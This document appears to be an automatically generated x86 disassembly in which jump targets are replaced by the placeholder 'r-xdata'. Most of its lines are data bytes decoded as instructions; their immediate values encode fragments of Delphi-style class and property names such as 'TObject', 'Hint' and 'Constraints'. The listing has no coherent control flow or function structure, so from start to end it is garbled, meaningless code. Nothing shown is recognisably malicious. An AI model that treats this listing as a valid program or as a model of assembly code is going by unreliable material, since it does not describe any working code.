adc [ eax ] al
push esp
adc [ eax ] al
lea eax [ eax ]
mov eax 0x800448b
jbe r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
push ebx
je r-xdata
push esp
inc esp
jb r-xdata
push esp
adc [ eax ] al
push esp
adc [ eax ] al
or [ edi + 0x10000044 ] al
inc eax
add [ eax + r-xdata ] dl
or [ esi ] cl
outsb
je r-xdata
push cs
inc esp
add [ eax ] cl
jb r-xdata
add [ ecx ] al
pop eax
pop es
dec ecx
outsb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
jb r-xdata
sub al 0x11
inc eax
add [ eax + 0x4481 ] ch
jb r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
outsb
je r-xdata
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
outsb
je r-xdata
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
outsb
je r-xdata
outsb
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx + 0x54 ] si
inc esp
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
inc esp
or [ esi ] al
outsb
je r-xdata
je r-xdata
je r-xdata
sub al 0x11
inc eax
add [ edx * 2 + 0x10540041 ] cl
inc eax
add [ eax + edx + 0x40 ] dl
add [ ebp - 0x75b7ffc0 ] cl
inc esp
add [ eax ] cl
or [ ebx + ecx * 2 + 0x65 ] edx
jns r-xdata
je r-xdata
jb r-xdata
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : ecx ] al
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ebx ] eax
dec ebx
jns r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
je r-xdata
jb r-xdata
pop eax
add [ ecx ] al
push esp
dec edi
jb r-xdata
push ebx
outsb
jb r-xdata
add cl [ eax ]
push es
jb r-xdata
jb r-xdata
adc [ eax ] eax
push esp
adc [ eax ] al
push esp
adc [ eax ] al
pop esp
mov [ eax + eax + 0x8 ] es
mov [ eax + eax + 0x8 ] es
or eax 0x646e4554
inc esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x2c ] si
adc [ eax ] eax
test al 0x81
inc esp
add [ eax ] al
push ebx
outsb
add al 0x8
push es
dec ecx
add [ eax + 0x7 ] ebx
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
or [ esi ] cl
jbe r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
push esp
inc ebp
outsb
jb r-xdata
add [ ecx + edx ] ch
inc eax
add [ eax ] ch
adc [ eax ] al
lea eax [ eax ]
ror [ edx + 0xe080044 ] 0x1
push esp
inc ebx
push 0x2c007261
adc [ eax ] eax
sub [ eax ] dl
inc eax
add [ ebp - 0x752fffc0 ] cl
inc esp
add [ eax ] cl
push cs
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
or [ esi ] al
push esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
sub al 0x11
inc eax
add [ eax - 0x7c ] cl
inc esp
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebp - 0x733bffc0 ] cl
inc esp
add [ eax ] cl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
sub al 0x11
inc eax
add [ ecx + edx ] ch
inc eax
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ esp + ecx * 4 + 0x44 ] bl
add [ eax ] cl
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
jo r-xdata
adc [ eax ] eax
pop es
inc edx
outsd
outsd
insb
outsb
je r-xdata
je r-xdata
jb r-xdata
andps xmm2 [ ebx + 0x74 ]
popad
jb r-xdata
sub al 0x11
inc eax
add [ ecx + edx ] ch
inc eax
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebp - 0x7447ffc0 ] cl
inc esp
add [ eax ] cl
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
inc esp
outsd
or [ esi ] al
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsd
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
popad
outsb
add [ ecx + edx ] ch
jb r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jbe r-xdata
push ebx
add ecx [ eax ]
push es
add [ ebx + 0x4489e4c0 ] cl
add [ eax ] cl
andps xmm1 [ ebp + 0x6f ]
sub al 0x11
inc eax
add [ esi + eax * 4 + 0x550c0044 ] cl
inc ecx
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x45 ] bp
or [ esp + edx * 2 ] cl
inc esp
outsd
inc esp
outsd
insb
jb r-xdata
popad
outsb
je r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
push ebx
je r-xdata
jbe r-xdata
jbe r-xdata
inc ebp
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61430701
imul esi [ ebp + 0x49 ] 0x456f666e
jbe r-xdata
push 0x65
popad
jb r-xdata
je r-xdata
inc esp
outsd
arpl [ ebx + 0x45 ] bp
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
or [ ecx ] cl
dec esi
ja r-xdata
je r-xdata
inc eax
add [ eax - 0x7c ] cl
inc esp
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax ] cl
xchg [ eax + eax ] eax
adc [ eax ] al
nop
push esp
lea eax [ eax + eax + 0x8 ]
or al 0x54
sub al 0x11
outsb
je r-xdata
inc ebx
jpe r-xdata
andps xmm0 [ ebx + 0x61 ]
outsb
push edx
jae r-xdata
lodsb [ esi ]
xchg ebx eax
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
cwde
mov es [ eax + eax + 0x8 ]
outsb
je r-xdata
outsb
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edi + ecx + 0x54 ] si
inc esp
jb r-xdata
je r-xdata
jne r-xdata
adc [ 0x6c666e49 ] ecx
push esp
inc ebx
outsd
outsb
je r-xdata
outsd
arpl [ ebx + 0x43 ] bp
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
inc eax
jb r-xdata
pop ss
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
pop es
outsb
arpl [ ebp + 0x52 ] sp
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + edx + 0x8 ] si
dec ebp
outsd
add eax 0x63655254
je r-xdata
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x2c ] si
adc [ eax ] eax
dec eax
test [ eax + eax + 0xc ] al
mov es [ eax + eax + 0x8 ]
adc [ edi + eax * 2 + 0x65 ] edx
je r-xdata
inc esp
add [ 0x6f6c6c41 ] eax
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
outsd
insb
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
ja r-xdata
pop es
inc edx
outsd
outsd
insb
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x449020c0 ] cl
add [ eax ] cl
push ss
push edi
push 0x456c6565
jbe r-xdata
push 0x6e490774
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] 0x6e657645
outsd
outsb
jae r-xdata
outsb
je r-xdata
or [ edx ] cl
inc esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0xa ] si
jae r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
imul esp [ edi + 0x68 ] 0x6e490774
push eax
outsd
jae r-xdata
outsb
inc esp
outsd
arpl [ ebx + 0x7 ] bp
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] ch
inc eax
add [ ebx + edx * 4 + 0x44 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x448e98c0 ] cl
add [ eax ] cl
add [ edi ] eax
inc ebx
popad
jne r-xdata
or [ ebp + 0x6f ] cl
add [ ecx + edx ] ch
inc eax
add [ ebx + edx * 4 - 0x647bffbc ] ch
inc esp
add [ eax ] al
adc [ eax ] al
ror [ ebp + 0xf080044 ] 0x54
push ebx
je r-xdata
inc edx
outsd
outsd
insb
popad
outsb
inc esp
jb r-xdata
or [ edx ] ecx
arpl [ ecx + ecx + 0xa ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
je r-xdata
push edi
push 0x556c6565
push esp
dec ebp
outsd
jne r-xdata
add [ eax + edx + 0x40 ] dl
outsb
jb r-xdata
jb r-xdata
add eax 0x65530608
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
adc [ ebp + ecx * 2 + 0x6f ] dl
jne r-xdata
adc [ eax ] al
push esp
adc [ eax ] al
push esp
adc [ eax ] al
push esp
adc [ eax ] al
mov eax eax
cwde
pop [ eax + eax + 0x8 ]
jpe r-xdata
dec esi
ja r-xdata
or [ esi + 0x65 ] ecx
ja r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh bl
xchg ecx eax
inc esp
js r-xdata
insb
outsd
ja r-xdata
add eax 0x65530608
outsb
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
and [ eax + 0x16080044 ] dl
add [ edi ] eax
dec eax
popad
or [ ebp + 0x6f ] cl
jne r-xdata
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebx + 0x448f98c0 ] cl
add [ eax ] cl
sub al 0x11
inc eax
add [ eax ] ecx
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
pop es
dec ecx
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
dec esi
ja r-xdata
add [ eax ] ecx
push esp
dec edi
add [ eax + edx + 0x40 ] dl
inc ebp
jbe r-xdata
inc ebp
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push edx
jae r-xdata
push es
mov al 0x33
inc eax
add [ edx + ecx + 0x33b80042 ] cl
inc eax
add [ eax - 0x16 ] cl
inc esp
add [ ecx + esi ] cl
inc eax
add [ eax ] ch
xor [ eax ] eax
or al 0xc8
add [ eax ] al
push eax
imul eax [ ecx ] sub_421138
push eax
outsd
jo r-xdata
jne r-xdata
inc ebp
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
adc [ gs : eax ] cl
push eax
outsd
jae r-xdata
je r-xdata
outsb
je r-xdata
outsb
add [ eax ] ecx
je r-xdata
dec ecx
outsb
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
je r-xdata
jpe r-xdata
add [ eax ] bh
adc [ edx ] eax
jo r-xdata
add [ eax + 0x69 ] dl
inc ecx
inc ebp
js r-xdata
outsb
je r-xdata
add [ edx ] cl
push edi
push 0x446c6565
insb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
jo r-xdata
je r-xdata
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] ch
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
push eax
outsd
jae r-xdata
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] ch
inc eax
add [ edx * 2 + 0x10540041 ] cl
inc eax
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] cl
push 0x6e490774
push esp
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] ch
inc eax
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
or [ edi + 0x17080044 ] cl
lea eax [ eax ]
cmp [ ecx + 0x44 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
les edx [ ecx - 0x6c4fffbc ]
inc esp
add [ eax ] al
jbe r-xdata
add [ edx + 0x5c004493 ] ah
add [ eax ] eax
outsb
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
jbe r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] ch
inc eax
add [ edx * 2 + 0x41 ] cl
add [ eax ] al
add [ eax ] dl
inc eax
add [ eax + edx * 4 + 0x12080044 ] dl
push esp
inc ebx
outsd
outsb
add [ edi ] eax
dec eax
popad
outsb
insb
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] ecx
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
push 0x65
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
adc [ eax ] cl
dec ebp
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx + 0x8 ] si
dec ebp
outsd
jne r-xdata
adc [ eax ] cl
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
inc esp
add [ eax ] ch
test [ eax + eax + 0x20 ] 0x700044eb
mov eax [ ecx ]
add [ eax + ecx * 8 ] cl
push eax
outsd
jae r-xdata
add [ edi ] eax
dec eax
popad
outsb
insb
pop es
inc edx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
sub_449145
test [ eax + eax + 0x4 ] 0xcb
inc esp
add [ eax - 0x36 ] dh
inc esp
add [ esp + edx * 8 ] bl
inc esp
add [ eax + 0x11 ] dl
inc edx
add [ eax ] bh
push cs
inc edx
add [ eax ] dh
push cs
inc edx
add [ eax + 0x11 ] bl
inc edx
add [ edi + eax * 8 ] dh
inc esp
add [ eax - 0x4bffbb1b ] bh
in eax 0x44
add [ esi - 0x3687ffbc ] al
inc esp
add [ eax + edx * 8 - 0x2fdfffbc ] bh
inc esp
add [ eax - 0x27 ] cl
inc esp
add al al
enter 0x44 0xc4
enter 0x44 0xc0
clc
inc esp
add ah ch
clc
inc esp
add [ esp + edx * 8 ] al
inc esp
add [ edx + ecx * 8 ] bh
inc esp
add [ eax + 0x80044d5 ] dl
aad 0x44
add [ eax + ebx * 8 ] bl
inc esp
add al cl
salc
inc esp
add [ eax + ebp * 8 - 0x68fffbc ] dh
inc esp
add [ eax ] cl
fild [ eax + eax + 0x7c ]
fild [ eax + eax - 0x10 ]

sub_4492e4
inc esp
add [ edx + esi * 8 - 0xdc3ffbc ] bh
inc esp
add [ eax - 0xe ] ah
inc esp
add [ ecx + edi * 8 - 0xaf7ffbc ] ch
inc esp
add ah dh
clc
inc esp
add ah al
fadd [ eax + eax + 0x50 ]
rol [ eax + eax + 0x70 ] cl
jmp r-xdata
add [ eax ] ch
test [ eax + eax + 0x10 ] 0xf8
inc esp
add al cl
enter 0x44 0x74
in eax dx
inc esp
add ah bh
jmp r-xdata
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x57050004 ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
outsd
insb
nop
mov al 0x93
inc esp
add [ edi ] al
or [ ebx + eax * 2 + 0x6f ] dl
outsb
je r-xdata
[ edi + ecx * 8 - 0x96fffbc ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al [ eax ]
or ecx [ eax + 0x65 ]
insb
jo r-xdata
jae r-xdata
je r-xdata
outsd
insb
cmp [ ecx + 0x6a4c0044 ] dl
inc ecx
add [ ebx ] cl
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
xor eax [ eax ]
or al 0x31
outsd
outsb
je r-xdata
add bh bh
pushfd
iretd
jb r-xdata
call [ eax + 0x1 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
or [ eax ] al
or [ eax + 0x65 ] cl
insb
jo r-xdata
dec esp
add [ eax ] al
call [ esi + ecx * 8 ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48060005 ] al
imul esp [ gs : edi + 0x68 ] 0x4480b874
push esp
adc [ eax ] al
add [ eax ] bh
add bh bh
inc eax
fadd [ eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax 0x65480600
imul esp [ edi + 0x68 ] 0x4480b874
outsd
insb
jae r-xdata
add [ esp + edx * 2 ] ecx
or [ ecx + 0x6d ] ch
push ebx
inc ecx
insb
jo r-xdata
add [ eax + 0x12 ] dh
inc edx
add ah al
adc al [ edx ]
test ah al
inc esp
add [ eax - 0x64 ] cl
inc ebp
add al bh
js r-xdata
adc [ eax ] al
add [ eax ] 0x0
inc [ eax + 0x70ff0000 ]
test [ eax + eax ] 0x0
add [ eax - 0x80000000 ] al
pop es
add [ eax + ecx * 2 ] al
imul ebp [ esi + 0x74 ] r-xdata
push eax
add [ eax ] eax
inc eax
add [ eax ] ch
xor [ eax ] eax
and al 0x12
inc edx
add [ ebx + edi * 8 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jns r-xdata
movsb [ edi ] [ esi ]
int 0x44
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4c040002 ] al
je r-xdata
add [ eax + edx + 0x40 ] dl
add [ eax ] al
add bh bh
insb
inc ebp
add [ gs : bx + si ] eax
add [ eax ] al
add [ ebx ] al
jb r-xdata
je r-xdata
popad
pop es
imul ebp [ ebp + 0x41 ] 0x6168706c
push es
imul ebp [ ebp + 0x48 ] 0x7617269
imul ebp [ ebp + 0x53 ] 0x6174614b
push es
imul ebp [ ebp + 0x4b ] 0x9617461
imul ebp [ ebp + 0x43 ] 0x656e6968
jae r-xdata
les eax [ eax + eax + 0x70 ]
pushfd
inc ebp
add [ eax ] bh
sti
inc esp
add [ eax - 0x3a ] dh
inc esp
add [ eax * 8 - 0x633fffbc ] ch
inc ebp
add ah dl
pushfd
inc ebp
add [ ebp + eax * 8 + 0x44 ] ah
add ah bh
pushfd
inc ebp
add al al
lds eax [ eax + eax + 0x4 ]
popfd
inc ebp
add al ah
lds eax [ eax + eax + 0xc ]
popfd
inc ebp
add [ eax - 0x5 ] al
inc esp
add ah dl
mov [ eax + eax + 0x14 ] 0xc7
inc esp
add [ eax ] al
mov [ eax + eax + 0x20 ] 0x9d
inc ebp
add [ ebx * 4 - 0x39dbffbb ] ah
inc esp
add [ ebx + eax * 8 + 0x54150044 ] dl
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x95e0c08b
inc esp
add [ ebx ] al
or [ ecx + ecx * 2 + 0x6d ] dl
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] cl
add [ eax ] al
add ah bl
xchg ebp eax
inc esp
clc
dec eax
xchg ebp eax
inc esp
add [ eax ] al
add [ eax + eax ] ah
add [ eax ] al
mov al 0x85
inc esp
add [ ebx + esi + 0x33b00040 ] ah
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
lodsb [ gs : esi ]
adc [ eax ] al
push esp
add [ eax ] eax
push [ eax - 0x6fffbb31 ]
test [ eax + eax ] 0x0
add [ eax - 0x80000000 ] al
or [ eax ] eax
or ecx [ eax + 0x65 ]
insb
jo r-xdata
add [ 0x65480600 ] 0x69
push 0x4480b874
adc [ eax ] al
inc esp
add [ eax ] al
dec eax
int 0x44
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x54030003 ] al
outsd
jo r-xdata
pop es
bound esp [ ebp + 0x54 ]
outsd
jo r-xdata
xchg esi eax
imul esp [ esp + esi * 2 + 0x68 ] 0x5
add bh bh
add [ eax ] al
add al ah
xchg esi eax
inc esp
add [ esi ] al
bound esp [ ebp + 0x4c ]
je r-xdata
add eax 0x0
xchg esi eax
inc esp
add [ esi ] al
bound esi [ esi + 0x4e ]
outsd
outsb
or [ gs : edx + 0x76 ] esp
or ch [ ecx + 0x6d ]
push ebx
dec eax
popad
outsb
jne r-xdata
add ah al
xchg ebp eax
inc esp
jns r-xdata
add [ eax ] al
push es
add [ esi ] al
inc ebx
jne r-xdata
add [ eax ] al
adc [ eax ] al
dec eax
add [ eax ] al
push eax
int 0x44
add [ ecx ] al
add [ eax ] al
imul esp [ esp + esi * 2 + 0x68 ] 0x105
outsd
insd
or [ ebx + 0x6f ] al
outsb
je r-xdata
inc edx
outsd
je r-xdata
or [ edx + 0x65 ] ah
bound esp [ ebp + 0x52 ]
imul esp [ edi + 0x68 ] 0x65620874
add [ ebx ] al
add [ eax ] al
add [ edi + edx * 4 ] bh
add [ esi ] al
jb r-xdata
dec esp
outsd
ja r-xdata
or [ edx + 0x76 ] esp
insb
or [ ecx + 0x6d ] ebp
dec eax
popad
outsb
jne r-xdata
inc esp
add [ eax + 0x12 ] bl
inc edx
add [ eax - 0x73ffbb3b ] bl
adc al [ edx ]
inc esp
mov [ eax + eax - 0x24 ] 0x11
inc edx
outsd
jb r-xdata
add bh bh
add [ eax ] al
outsd
insb
jae r-xdata
or [ ebx + 0x6f ] al
bound ebp [ ebx + 0x46 ]
insb
popad
je r-xdata
add [ eax ] al
insb
inc ebp
jae r-xdata
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
or [ fs : edx + 0x76 ] ah
push edx
popad
imul esi [ ebx + 0x65 ] 0x76620764
push ebx
or [ edx + 0x76 ] ah
insb
or [ ebx + 0x6f ] al
outsb
je r-xdata
inc eax
add [ ecx + esi ] cl
and al 0x55
inc ecx
add [ eax + 0x1 ] bl
inc esp
add [ esi ] al
bound ebp [ ebx + 0x4e ]
outsd
outsb
push es
bound ebp [ ebx + 0x54 ]
imul ebp [ ebp + 0x6 ] 0x6f536b62
je r-xdata
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
cmp al 0x97
xchg edi eax
inc esp
cwde
inc esp
add [ esi - 0x65 ] dh
outsd
insb
jae r-xdata
mov eax eax
test [ edi + 0xb010044 ] dl
push esp
outsb
je r-xdata
inc ebx
outsd
xchg esi eax
loopne r-xdata
add eax esp
arpl [ ebp + 0x8 ] sp
inc ebx
outsd
outsb
je r-xdata
outsd
insb
jae r-xdata
add [ eax ] dh
sbb [ ebp ] al
jo r-xdata
inc esp
add [ eax + 0x3c ] dl
inc ebp
add [ edi + 0x38080045 ] cl
inc ebp
add al dh
cmp al 0x45
add [ eax + 0x1c0044fe ] cl
add eax 0x12bc0045
inc ebp
add [ eax - 0x5bffbaf4 ] ch
cmovne eax [ eax ]
aam 0xd
inc ebp
add [ ebx + edx + 0x45 ] dl
add [ eax + 0x13 ] bl
inc ebp
add [ eax ] dl
adc al [ ebp ]
mov eax 0x30004511
inc ebp
add [ eax ] al
sbb al 0x45
add [ eax + edx * 2 ] ah
inc ebp
add [ edx + edi + 0x3d9c0045 ] ch
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edi + edx * 4 + 0x17c0044 ] bl
add [ eax ] al
insb
xchg esi eax
inc esp
add [ eax + 0x69000001 ] cl
add [ edi ] cl
add [ ecx ] dl
add [ esi ] ecx
adc eax 0x15011400
add [ ecx ] edi
add [ 0x2c002b00 ] ch
add [ eax + eax ] dl
inc edi
add [ esi ] al
add eax 0x20000300
add [ eax ] al
add [ ecx + eax ] eax
add [ ecx ] eax
add eax 0x12010201
add [ edi ] ebp
add [ eax ] dl
add ch [ esi ]
add [ edx ] al
add [ ebx - 0x7bff7e00 ] al
add [ ebp + 0x11030f00 ] al
add ebx [ edx ]
add [ 0x7001e00 ] bl
add [ eax ] cl
add [ 0x7b010e01 ] cl
add [ edi ] dh
mov al 0x2e
mov al 0x5
mov al 0x6
mov al 0x7
mov al 0xb
mov al 0xc
mov al 0xd
mov al 0xe
mov al 0x3b
mov al 0xf
mov al 0x10
mov al 0x11
mov al 0x19
mov al 0x22
mov al 0x1a
mov al 0x1b
mov al 0x1c
mov al 0x24
mov al 0x35
mov al 0x25
mov al 0x26
mov al 0x27
mov al 0x2f
mov al 0x0
mov ebp 0xbd02bd01
add al 0xbd
push es
mov ebp 0xb033b02c
xor al 0xb0
cmp [ eax - 0x4fc54fc7 ] dh
cmp al 0xb0
sbb [ ebx ] al
out dx eax
inc edx
jbe r-xdata
rol [ edi + edx * 4 + 0xb010044 ] 0x54
jbe r-xdata
insb
push edi
jb r-xdata
insb
dec ebx
imul ebp [ esi + 0x64 ] 0x1
jo r-xdata
pop es
bound esi [ esi + 0x53 ]
inc esp
add [ ebx + 0x449740c0 ] cl
add [ ebx ] al
or dl [ edx + eax * 2 + 0x65 ]
jbe r-xdata
add [ eax ] al
outsd
insb
jae r-xdata
add [ ecx ] cl
imul ebp [ ebp + 0x44 ] 0x62617369
insb
pop es
imul ebp [ ebp + 0x43 ] 0x65736f6c
push es
imul ebp [ ebp + 0x4f ] 0xa6e6570
imul ebp [ ebp + 0x44 ] 0x43746e6f
popad
jb r-xdata
inc edx
outsd
jb r-xdata
shl [ eax - 0x6a ] 0x44
add [ edx ] cl
or [ ecx + ecx * 2 + 0x6d ] dl
inc esp
add [ edx + eax ] al
add [ eax ] al
in al dx
nop
inc esp
add [ eax ] bh
adc [ edx ] eax
mov al 0x33
inc eax
add [ edx + ecx + 0x33b80042 ] cl
inc eax
add [ ecx + ebx + 0x310c0045 ] dl
inc eax
add [ eax ] ch
xor [ eax ] eax
insb
cld
inc esp
add [ ecx + ecx * 2 ] dh
inc ebp
add [ ecx + edx + 0x45 ] bl
add [ eax - 0x75 ] dh
inc ecx
add al dh
test [ eax + eax + 0x4 ] 0xcb
inc esp
add [ eax ] dl
inc [ eax + eax + 0x1c ]
aam 0x44
add [ eax + 0x11 ] dl
inc edx
adc [ eax ] eax
add [ ecx - 0x3 ] edi
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0x4308e870 ] eax
outsd
outsb
je r-xdata
dec esi
popad
insd
mov eax eax
adc [ esi + 0xc010044 ] 0x54
or cl [ eax ]
push esp
dec ecx
insd
inc esp
add [ ebx ] al
or dl [ edx + eax * 2 + 0x65 ]
jbe r-xdata
in al 0x96
add [ eax ] bh
push cs
inc edx
add [ eax ] dh
push cs
inc edx
add [ eax + 0x11 ] bl
inc edx
add [ eax - 0x5 ] cl
inc esp
add [ eax + 0x44 ] cl
inc ebp
add [ ecx + ecx * 2 + 0x45 ] ah
add [ eax + 0x78004548 ] dh
leave
inc esp
add ah al
inc ebp
add ah ah
inc ebp
add ah bh
cmp eax [ ebp ]
ror al 0x44
add ah al
enter 0x44 0xc0
clc
inc esp
add ah ch
clc
inc esp
add [ esp + edx * 8 ] al
inc esp
add [ edx + ecx * 8 ] bh
inc esp
add [ eax + 0x80044d5 ] dl
aad 0x44
add [ eax + ebx * 8 ] bl
inc esp
add al cl
salc
inc esp
outsd
insb
jae r-xdata
add [ eax ] al
add [ eax ] al
in al 0x98
inc esp
add [ eax + 0x449b ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh bh
add bh bh
[ eax + ebx * 4 ]
inc esp
